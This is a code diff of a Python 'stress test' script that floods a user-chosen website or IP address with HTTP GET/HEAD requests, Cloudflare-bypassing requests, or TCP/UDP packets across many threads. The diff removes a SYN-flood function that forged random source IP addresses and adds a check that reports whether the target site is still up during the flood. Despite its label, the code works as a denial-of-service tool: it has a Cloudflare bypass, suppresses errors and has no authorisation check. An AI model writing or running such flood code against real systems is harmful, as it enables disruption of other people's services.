@@ -4,18 +4,20 @@ import socket
 import threading
 import time
 from colorama import Fore, Style, init
-from scapy.all import *
 
 # Initialize colorama
 init()
 
 # Set the protocol/method to use for sending requests
-protocol = input("Enter the protocol/method to use (tcp, udp, get, head, cfb, or syn): ")
+print("Enter the protocol/method to use:")
+print("Layer 7: get, head, cfb")
+print("Layer 4: tcp, udp")
+protocol = input()
 
 if protocol in ["get", "head", "cfb"]:
     # Set the URL of the website to test
     url = input("Enter the website URL (including http or https): ")
-elif protocol in ["tcp", "udp", "syn"]:
+elif protocol in ["tcp", "udp"]:
     # Set the IP address and port of the server to test
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
@@ -43,7 +45,7 @@ def stress_test(thread_id):
         client = cloudscraper.create_scraper()
     elif protocol in ["get", "head"]:
         client = httpx.Client()
-    elif protocol in ["tcp", "udp", "syn"]:
+    elif protocol in ["tcp", "udp"]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     else:
         print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
@@ -53,21 +55,31 @@ def stress_test(thread_id):
     last_print_time = start_time
     if thread_id == 0:
         if protocol in ["get", "head", "cfb"]:
-            print(Fore.YELLOW + f"Stressing started on {url} successfully!" + Style.RESET_ALL)
-        elif protocol in ["tcp", "udp", "syn"]:
-            print(Fore.YELLOW + f"Stressing started on {ip}:{port} successfully!" + Style.RESET_ALL)
+            print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
+        elif protocol in ["tcp", "udp"]:
+            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
         if protocol in ["get", "head", "cfb"]:
             send_request(client)
+            with packet_counter_lock:
+                packet_counter += 1
         elif protocol in ["tcp", "udp"]:
             send_packet(sock)
             with packet_counter_lock:
                 packet_counter += 1
-        elif protocol == "syn":
-            send_syn(thread_id)
         if thread_id == 0 and time.time() - last_print_time >= 10:
             with packet_counter_lock:
-                print(f"Sent {packet_counter} packets to {ip}:{port}")
+                if protocol in ["get", "head", "cfb"]:
+                    try:
+                        response_start_time = time.time()
+                        response = httpx.get(url)
+                        response_end_time = time.time()
+                        response_time = round((response_end_time - response_start_time) * 1000, 2)
+                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms. Sent {packet_counter} requests to {url}" + Style.RESET_ALL)
+                    except Exception as e:
+                        print(Fore.RED + f"Website is down. Sent {packet_counter} requests to {url}" + Style.RESET_ALL)
+                elif protocol in ["tcp", "udp"]:
+                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                 last_print_time = time.time()
     if thread_id == 0:
         print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
@@ -91,20 +103,6 @@ def send_packet(sock):
             sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
     except Exception as e:
         pass # Suppress error messages
-
-def send_syn(thread_id):
-    global packet_counter
-
-    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-    ip_layer = IP(src=src_ip, dst=ip)
-    tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
-    raw_layer = Raw(b"X"*1024)
-    p = ip_layer / tcp_layer / raw_layer
-
-    send(p, verbose=0)
-
-    with packet_counter_lock:
-        packet_counter += 1
 
 # Create and start the threads
 threads = []
